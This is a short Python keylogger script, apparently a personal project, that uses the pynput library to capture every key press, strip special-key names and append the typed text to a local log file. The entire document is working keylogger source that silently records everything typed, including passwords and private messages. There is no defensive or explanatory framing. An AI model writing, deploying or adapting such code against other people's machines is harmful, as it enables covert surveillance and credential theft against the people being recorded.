from pynput.keyboard import Listener
import re 

arqlog = 'C:/Users/zidani/Desktop/projetos/log.log'

def cap(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    
    with open (arqlog, "a") as log:
        log.write(tecla)

with Listener(on_press=cap) as Z:
    Z.join()


    